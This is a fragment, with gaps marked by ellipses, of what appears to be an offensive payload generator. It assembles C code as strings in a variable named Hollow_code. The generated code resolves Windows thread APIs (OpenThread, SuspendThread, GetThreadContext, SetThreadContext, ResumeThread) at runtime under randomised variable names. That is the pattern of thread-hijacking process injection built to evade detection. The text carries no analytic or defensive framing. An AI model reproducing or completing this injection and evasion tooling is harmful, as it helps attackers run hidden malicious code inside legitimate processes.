...
Hollow_code += "FARPROC " + NdcT32First + " = GetProcAddress(" + Ker32 + ", \"Thread32First\");\n"
Hollow_code += "FARPROC " + NdcT32Next + " = GetProcAddress(" + Ker32 + ", \"Thread32Next\");\n"
...
Hollow_code += "FARPROC " + NdcOpenThread + " = GetProcAddress(" + Ker32 + ", \"OpenThread\");\n"
...
Hollow_code += "FARPROC " + NdcSuspendThread + " = GetProcAddress(" + Ker32 + ", \"SuspendThread\");\n"
...
Hollow_code += "FARPROC " + NdcGetThreadContext + " = GetProcAddress(" + Ker32 + ", \"GetThreadContext\");\n"
...
Hollow_code += "FARPROC " + NdcSetThreadContext + " = GetProcAddress(" + Ker32 + ", \"SetThreadContext\");\n"
Hollow_code += "if (((BOOL)" + NdcSetThreadContext + "(" + RandTargetThread + ", &" + RandTcontext + ")) != 0){;\n"
Hollow_code += "FARPROC " + NdcResumeThread + " = GetProcAddress(" + Ker32 + ", \"ResumeThread\");\n"
